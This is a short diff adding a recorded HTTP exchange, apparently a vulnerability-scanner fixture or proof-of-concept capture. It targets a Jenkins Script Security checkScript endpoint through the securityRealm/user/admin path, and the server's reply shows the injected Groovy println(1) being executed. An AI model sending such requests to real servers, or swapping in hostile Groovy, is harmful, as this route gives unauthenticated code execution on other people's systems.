@@ -1,0 +1,12 @@
+====== REQUEST ======
+GET /jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(1) HTTP/1.1
+Host: 10.4.12.1:8080
+User-Agent: Mozilla/5.0
+Accept: text/plain
+
+====== RESPONSE ======
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Server: Jetty(9.4.z-SNAPSHOT)
+
+Result: 1
